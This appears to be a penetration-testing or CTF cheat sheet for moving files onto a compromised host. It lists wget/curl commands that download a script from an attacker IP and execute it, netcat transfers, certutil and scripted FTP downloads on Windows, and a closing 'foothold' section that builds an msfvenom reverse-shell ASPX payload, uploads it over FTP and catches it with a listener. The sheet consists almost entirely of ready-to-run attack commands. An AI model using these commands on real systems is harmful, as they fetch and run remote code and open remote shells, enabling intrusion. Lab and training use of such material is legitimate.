## Linux
- `python3 -m http.server 80`
   - start web server from location file is at
- `wget http://ip/file.sh`
- OR
- `curl -O http://10.10.10.10/file.sh`
  - `chmod +x file.sh`
  - `./file.sh`
 
#### Netcat
- Local host
  - `nc -nvlp 4444 < file`
- Target host
  - `nc <hostip> 4444 > file`
- If get this error: This is nc from the netcat-openbsd package. An alternative nc is available
  - run this: `nc -l 1234 > file.sh`
 
#### SSH
- for a better shell, can try ssh
- .ssh files in /home/user -> identify with `ls -la`
- create keypair
  - ssh-keygen
- Can use SCP now
  - `scp /path/to/source/file.ext username@10.0.0.10:/path/to/destination/file.ext`

 ## Windows
 - Doesnt typically have netcat, wget or curl

#### Certutil
- certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt

#### FTP
- try ftp 10.10.10.10
 - Can create a file with the following:
   - `echo open 10.10.10.10> ftpreq.txt`
   - `echo USER username>> ftpreq.txt`
   - `echo password>> ftpreq.txt`
   - `echo bin>> ftpreq.txt`
   - `echo GET wget.exe>> ftpreq.txt`
   - `echo bye>> ftpreq.txt`
  - Run `ftp -v -n -s:ftpreq.txt`

## Original foothold:
- Manual shell msfvenom
- `Msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT=4444 -f aspx > shell.aspx`
- Put it into the FTP
- Set up a listener and navigate to it via firefox
